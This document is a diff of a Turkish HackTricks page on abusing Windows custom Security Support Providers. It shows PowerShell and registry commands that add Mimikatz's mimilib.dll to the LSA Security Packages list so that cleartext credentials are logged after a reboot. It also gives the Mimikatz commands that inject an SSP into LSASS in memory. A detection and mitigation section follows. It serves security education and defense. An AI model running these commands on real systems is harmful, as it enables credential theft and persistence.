@@ -1,40 +1,49 @@
-# Custom SSP
+# Custom Security Support Providers
 
 {{#include ../../banners/hacktricks-training.md}}
 
-### Custom SSP
+[Security Support Providers (SSP'ler)](../authentication-credentials-uac-and-efs/index.html#security-support-provider-interface-sspi), Local Security Authority (LSA) tarafından yüklenen DLL tabanlı güvenlik paketleridir. Windows, özel SSP/AP DLL'lerini `HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages` `REG_MULTI_SZ` değeri üzerinden kaydeder ve sistem başlatıldığında kayıtlı paketleri yükler.<sup>[[1]](#references)</sup>
 
-[SSP'nin (Security Support Provider) ne olduğunu buradan öğrenin.](../authentication-credentials-uac-and-efs/index.html#security-support-provider-interface-sspi)\
-Makineye erişmek için kullanılan **credentials** bilgilerini **clear text** olarak **capture** etmek üzere **kendi SSP'nizi** oluşturabilirsiniz.
+SSP'ler LSA içinde çalışabildiğinden ve kimlik bilgilerini alabileceğinden, saldırganlar kötü amaçlı bir paketi credential access ve persistence amacıyla kötüye kullanabilir. MITRE bu davranışı T1547.005 olarak izler.<sup>[[2]](#references)</sup>
 
-#### Mimilib
+## Mimikatz `mimilib`
 
-Mimikatz tarafından sağlanan `mimilib.dll` binary dosyasını kullanabilirsiniz. **Bu, tüm credentials bilgilerini clear text olarak bir dosyaya kaydeder.**\
-DLL'yi `C:\Windows\System32\` konumuna bırakın.\
-Mevcut LSA Security Packages listesini alın:
-```bash:attacker@target
-PS C:\> reg query hklm\system\currentcontrolset\control\lsa\ /v "Security Packages"
-
-HKEY_LOCAL_MACHINE\system\currentcontrolset\control\lsa
-Security Packages    REG_MULTI_SZ    kerberos\0msv1_0\0schannel\0wdigest\0tspkg\0pku2u
+Mimikatz, yüklendikten sonra işlenen kimlik bilgilerini kaydeden bir SSP uygulayan `mimilib.dll` dosyasını içerir. Yetkili bir lab ortamında hedef mimariyle eşleşen DLL'yi `C:\Windows\System32` konumuna yerleştirin, ardından değiştirmeden önce mevcut paket listesini inceleyin.<sup>[[2]](#references)[[3]](#references)</sup>
+```powershell
+$lsaPath = 'HKLM:\SYSTEM\CurrentControlSet\Control\Lsa'
+$packages = (Get-ItemProperty -Path $lsaPath -Name 'Security Packages').'Security Packages'
+$packages
 ```
-`mimilib.dll` dosyasını Security Support Provider listesine (Security Packages) ekleyin:
-```bash
-reg add "hklm\system\currentcontrolset\control\lsa\" /v "Security Packages"
+Tipik bir mevcut değer `kerberos`, `msv1_0`, `schannel`, `wdigest`, `tspkg` ve `pku2u` gibi paketler içerebilir. Özel paketi eklerken mevcut her girdiyi koruyun.<sup>[[1]](#references)</sup>
+
+Mevcut paketleri değiştirmeden `mimilib` ekleyin:
+```powershell
+if ($packages -notcontains 'mimilib') {
+Set-ItemProperty -Path $lsaPath -Name 'Security Packages' -Value ($packages + 'mimilib')
+}
 ```
-Ve yeniden başlatmanın ardından tüm kimlik bilgileri `C:\Windows\System32\kiwissp.log` içinde açık metin olarak bulunabilir.
+Yeniden başlatmanın ardından paket LSA'ya yüklenir ve bu implementation tarafından yakalanan sonraki kimlik bilgileri `C:\Windows\System32\kiwissp.log` dosyasına yazılır.<sup>[[2]](#references)[[3]](#references)</sup>
 
-#### Bellekte
+## Bellek İçi Yükleme
 
-Bunu Mimikatz kullanarak doğrudan belleğe de enjekte edebilirsiniz (biraz kararsız olabileceğini/çalışmayabileceğini unutmayın):
-```bash
+Mimikatz ayrıca SSP implementation'ını mevcut LSASS işlemine inject edebilir:<sup>[[3]](#references)</sup>
+```text
 privilege::debug
 misc::memssp
 ```
-Bu, yeniden başlatmalardan sonra kalıcı olmaz.
+Bu yöntem yeniden başlatma sonrasında kalıcı olmaz.<sup>[[2]](#references)[[3]](#references)</sup>
 
-#### Önlem
+## Tespit ve Azaltma
 
-Event ID 4657 - `HKLM:\System\CurrentControlSet\Control\Lsa\SecurityPackages` oluşturulmasını/değiştirilmesini denetle
+`...\Lsa\Security Packages` üzerindeki değişiklikleri ve `lsass.exe` içine beklenmeyen DLL yüklemelerini izleyin. Security event 4657, yalnızca ilgili Audit Registry policy ve SACL yapılandırıldığında bir registry **value** değişikliğini kaydeder.<sup>[[2]](#references)[[4]](#references)</sup>
 
+Uyumlu olduğu durumlarda ek LSA protection özelliğini etkinleştirin ve imzasız veya beklenmeyen SSP DLL'lerini araştırın. Microsoft, LSA protection özelliğini kimlik bilgilerini tehlikeye atabilecek code injection saldırılarına karşı özel olarak bir güvenlik önlemi olarak belgeler.<sup>[[5]](#references)</sup>
+
+## References
+
+- [1] [Microsoft Learn - SSP/AP DLL'lerini kaydetme](https://learn.microsoft.com/en-us/windows/win32/secauthn/registering-ssp-ap-dlls)
+- [2] [MITRE ATT&CK T1547.005 - Security Support Provider](https://attack.mitre.org/techniques/T1547/005/)
+- [3] [Mimikatz repository - `mimilib`](https://github.com/gentilkiwi/mimikatz/tree/master/mimilib)
+- [4] [Microsoft Learn - Security event 4657](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4657)
+- [5] [Microsoft Learn - Ek LSA protection özelliğini yapılandırma](https://learn.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/configuring-additional-lsa-protection)
 {{#include ../../banners/hacktricks-training.md}}
